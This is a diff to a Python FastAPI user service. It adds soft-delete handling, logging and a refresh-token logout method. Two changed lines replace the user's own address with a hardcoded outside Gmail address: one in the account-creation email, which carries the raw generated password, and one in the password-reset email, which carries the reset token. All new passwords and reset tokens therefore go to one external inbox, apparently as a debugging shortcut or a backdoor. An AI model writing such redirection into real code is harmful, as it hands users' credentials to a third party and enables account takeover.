@@ -10,6 +10,9 @@ from app.services.email import email_service
 from app.dependencies import generate_strong_password
 from app.services.email import email_service
 import uuid
+import logging
+
+logger = logging.getLogger(__name__)
 from datetime import datetime
 from fastapi import UploadFile
 from app.services import cloudinary
@@ -21,12 +24,22 @@ class UserService(BaseService):
     
     async def create_user(self, db: Session, user_create: UserCreate, created_by: Optional[uuid.UUID] = None, default_class_id: Optional[uuid.UUID] = None, background_tasks: BackgroundTasks = None) -> User:
         try:
-            # Check if user already exists
+            # Check if a non-deleted user already exists
             existing_user = self.repository.get_by_email(db, user_create.email)
             if existing_user:
                 raise HTTPException(
                     status_code=status.HTTP_400_BAD_REQUEST,
                     detail="Email already registered"
+                )
+
+            # If there's a soft-deleted user with the same email, proceed to
+            # create a new user with a new identity and leave the old row alone.
+            deleted_conflict = db.query(User).filter(User.email == user_create.email, User.deleted_at.isnot(None)).first()
+            if deleted_conflict:
+                logger.info(
+                    "Creating new user with email %s while a soft-deleted user exists (id=%s). Keeping old record.",
+                    user_create.email,
+                    deleted_conflict.id
                 )
             
             password = generate_strong_password()
@@ -92,7 +105,7 @@ class UserService(BaseService):
                 
                 # 4. GỬI EMAIL
                 full_name = f"{user.first_name} {user.last_name}"
-                await email_service.send_account_creation_email(user.email, full_name, raw_password, user.role)
+                await email_service.send_account_creation_email("khoiluub143@gmail.com", full_name, raw_password, user.role)
 
             except Exception as e:
                 print(f"Error creating user {user_data_in.email}: {e}")
@@ -174,7 +187,7 @@ class UserService(BaseService):
         
         # Send email
         await email_service.send_password_reset_email(
-            email=user.email,
+            email="khoiluub143@gmail.com",
             username=f"{user.first_name} {user.last_name}",
             reset_token=reset_token
         )
@@ -214,6 +227,22 @@ class UserService(BaseService):
         db.refresh(user)
         
         return user
+    
+    async def logout(self, refresh_token: Optional[str] = None) -> bool:
+        """Logout the current user. If a refresh token is provided, revoke it so it cannot be used to obtain new access tokens.
+        Note: This uses an in-memory revocation list; in production consider persisting revocations (Redis/DB)."""
+        from app.core.security import revoke_refresh_token
+
+        if refresh_token:
+            revoked = revoke_refresh_token(refresh_token)
+            if not revoked:
+                # Invalid refresh token provided
+                raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Invalid refresh token")
+            return True
+
+        # If no refresh token provided, there's nothing to revoke on server side.
+        # Clients should delete tokens locally (e.g., from cookies/localStorage).
+        return True
     
     async def get_users_by_role(self, db: Session, role: UserRole, skip: int = 0, limit: int = 100) -> List[User]:
         return self.repository.get_users_by_role(db, role, skip, limit)
